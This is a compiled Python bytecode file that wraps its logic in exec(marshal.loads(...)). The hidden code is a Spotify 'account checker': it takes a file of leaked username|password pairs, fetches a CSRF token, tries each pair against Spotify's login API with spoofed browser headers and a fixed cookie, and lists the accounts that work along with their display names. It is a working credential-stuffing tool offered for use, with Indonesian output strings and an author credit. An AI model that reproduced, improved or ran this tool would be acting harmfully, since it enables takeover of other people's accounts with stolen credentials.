B
    ���\?  �               @   s   d dl Z ee �d�� dS )�    Ns+  �               @   st   d dl mZ d dl T d dlmZ d dlZd dlZg ag ag a	dd� Z
edkrpe� Zdd	ge_G d
d� d�Ze�  dS )�    )�get)�*)�PrettyTableNc             C   sn  �yBt |d���,}|�� }�x|D �]}|�� }|�d�}d}t|�jd }| }	ddddd	dd
ddd�||d �d�
}
d|d |d |d�}t|	||
d�}|jdkr�t	�
|j�}td�|d |d �� t�|d d |d  � t�|d � q"q"|jdkr"td�|d |d �� t�|d d |d  � q"q"q"W W d Q R X W n$ tk
�rh   td� t�  Y nX d S )N�rz| zvhttps://accounts.spotify.com/en/login/?continue=https:%2F%2Fwww.spotify.com%2Fus%2Faccount%2Foverview%2F&_locale=en-US�
csrf_tokenzaccounts.spotify.comzDMozilla/5.0 (X11; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0z!application/json, text/plain, */*zen-US,en;q=0.5zgzip, deflate, brz!application/x-www-form-urlencodedZ504z
keep-alivea1  sp_t=159a69cbe9373cb05a2dbffd33ff1ce5; sp_ab=%7B%222019_04_login_redirect_v3%22%3A%22control%22%2C%222019_04_premium_menu%22%3A%22control%22%7D; spot=%7B%22t%22%3A1556119719%2C%22m%22%3A%22us%22%2C%22p%22%3A%22open%22%7D; _ga=GA1.2.357062281.1555942906; _gcl_au=1.1.824316369.1555942909; sp_usid=ac490765-0f2f-4d3c-9ffa-43b771802d28; _gid=GA1.2.952122370.1556119552; csrf_token={}; __bon=MHwwfDgwNzE3Njk2NXwzMzkwMTQzMjUzMHwxfDF8MXwx; _fbp=fb.1.1556119719663.1120476936; fb_continue=https%3A%2F%2Fwww.spotify.com%2Fus%2Faccount%2Foverview%2F; remember={}; _gat=1r   )
ZHostz
User-AgentZAcceptzAccept-LanguagezAccept-EncodingZRefererzContent-TypezContent-LengthZ
ConnectionZCookie�true�   )ZrememberZusernameZpasswordr   )�dataZheaders��   z*Username: {} | Password: {} ----> Valid!! ZdisplayNamei�  z0Username: {} | Password: {}  ----> Tidak Valid!!z/--path path yg anda masukkan tidak di temukan!!)�open�	readlines�strip�splitr   Zcookies�formatZpostZstatus_code�json�loads�text�print�valider�append�zzz�unvalid�FileNotFoundError�exit)Zurl�pathr   �m�xZmmeZfiltZlocalZ	csrf_headZurll�headr	   ZreqZjs� r   �hehe�ashiap   sL    


r    �__main__zUsername And PasswordzAccount Namec               @   s   e Zd Ze�� Zdd� ZdS )�parsec             C   s�   t jjddd d� t jjdddd� t j�� }|r�|jr�td|j� td	�tt	�tt
��� td
� x,tdtt	��D ]}t�t	| t| g� qtW tt� n|jr�td� ntd� d S )Nz--pathzHPut Path Files located on file Empas Spotify and directly automate check)�help�defaultz--aboutzAbout Created this toolsZ
store_true)r#   �actionz&https://accounts.spotify.com/api/loginz-=====================
Valid: {0}
Unvalid: {1}z========Valid========r   zNMy Name Is: Agung sp
 im from Indonesian People
Thanks To Zekkel AR, crbs -allz--help)r"   �psZadd_argumentZ
parse_argsr   r    r   r   �lenr   r   �ranger   Zadd_rowr   Zabout)�selfZmlZccr   r   r   �__init__?   s    


zparse.__init__N)�__name__�
__module__�__qualname__�argparseZArgumentParserr&   r*   r   r   r   r   r"   =   s   r"   )Zrequestsr   ZGettCookiesZprettytabler   r   r.   r   r   r   r    r+   r   �field_namesr"   r   r   r   r   �<module>   s   -
)�marshal�exec�loads� r   r   �#/home/agungs/Desktop/spotervalid.py�<module>   s   